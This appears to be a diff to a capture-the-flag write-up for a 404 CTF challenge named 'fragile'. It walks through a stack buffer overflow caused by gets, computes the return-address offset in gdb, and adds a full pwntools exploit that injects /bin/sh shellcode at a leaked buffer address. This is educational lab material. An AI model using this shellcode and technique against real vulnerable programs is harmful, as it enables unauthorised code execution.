@@ -43,7 +43,7 @@ So as you can see we have no stack canary protecting the stack from overriding t
 
 <img src = "./404_CTF_sansProtection.png">
 
-After a quick look at the main, i noticed that there was a call to the **gets** function wich was a little of bit wired since the **gets** function have no limit on the size of the input which can lead to a buffer overflow attack. After that, i have noticed also that the address that the program was displaying was the address of the buffer. The idead is quite simple, we will try to inject a 0x64 bit shellcode in the beginning of the buffer from [Shell Storm Website](https://shell-storm.org/shellcode/) that will give us a *system("bin/bash")* Syscall, after that we will try to overflow the buffer until we get to the return address of the program than just redierct the return to the address of the buffer to execute our malicious shellcode. so we needed to calculate the offset between the buffer and the return address. Let's fire up the gdb and set a break point after that **gets** call so i just typed in "mike" and then tried to calculate the offset from there :
+After a quick look at the main, i noticed that there was a call to the **gets** function wich was a little of bit wired since the **gets** function have no limit on the size of the input which can lead to a buffer overflow attack. After that, i have noticed also that the address that the program was displaying was the address of the buffer. The idead is quite simple, we will try to inject a 0x64 bit shellcode in the beginning of the buffer from [Shell Storm](https://shell-storm.org/shellcode/) that will give us a *system("bin/bash")* Syscall, after that we will try to overflow the buffer until we get to the return address of the program than just redierct the return to the address of the buffer to execute our malicious shellcode. so we needed to calculate the offset between the buffer and the return address. Let's fire up the gdb and set a break point after that **gets** call so i just typed in "mike" and then tried to calculate the offset from there :
 
 ````gdb
 gef➤  search-pattern "mike"
@@ -61,8 +61,37 @@ Stack level 0, frame at 0x7fffffffe140:
  Saved registers:
   rbp at 0x7fffffffe130, rip at 0x7fffffffe138
 ````
+Offset = 0x7fffffffe138 - 0x7fffffffe0f0 = 0x48.
 
+Here's the final exploit : 
 
+````python
+from pwn import *
+
+#target = remote('challenge.404ctf.fr', 31720)
+target = process('./fragile') 
+
+# Setting up the leak
+# 0x7ffe3c40e910
+screen = target.recvline().decode()
+leak = target.recvline().decode().strip("Cadeau :").strip("\n")
+leak = bytes(leak, 'utf-8')
+leak = int(leak, 16)
+
+# Print the leak
+print("Leak : ", hex(leak))
+
+# Setting up the Payload
+offset = 0x48
+payload = b""
+payload += b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
+payload += b"A"*(offset - len(payload))
+payload += p64(leak)
+
+#gdb.attach(target, gdbscript='b* 00400668')
+target.sendline(payload)
+target.interactive()
+````
 
 
 
